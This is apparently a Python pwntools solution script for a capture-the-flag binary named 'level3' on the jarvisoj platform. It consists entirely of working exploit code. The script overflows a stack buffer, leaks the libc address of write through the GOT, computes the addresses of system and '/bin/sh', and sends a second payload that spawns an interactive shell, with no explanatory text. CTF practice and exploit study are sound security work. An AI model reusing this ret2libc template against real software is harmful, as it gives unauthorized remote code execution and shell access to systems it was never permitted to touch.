# coding: utf-8
from pwn import *

local = 1 # 控制执行环境，0为远程，1为本地
if local:
    sh = process('./level3')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    sh = remote('pwn2.jarvisoj.com', 9879)
    libc = ELF('./libc-2.19.so')

elf = ELF('./level3')

write_plt = elf.plt['write']
write_got = elf.got['write']
vuln_addr = elf.symbols['vulnerable_function']

write_libc = libc.symbols['write']
sys_libc = libc.symbols['system']
shell_libc = libc.search('/bin/sh').next()

payload1 = 'a' * (0x88 + 0x4) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)

sh.recvuntil('Input:\n')
sh.sendline(payload1)

write_addr = u32(sh.recv(4))
sys_addr = write_addr - write_libc + sys_libc
shell_addr = write_addr - write_libc + shell_libc

payload2 = 'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(shell_addr)

sh.recvuntil('Input:\n')
sh.sendline(payload2)

sh.interactive()
sh.close()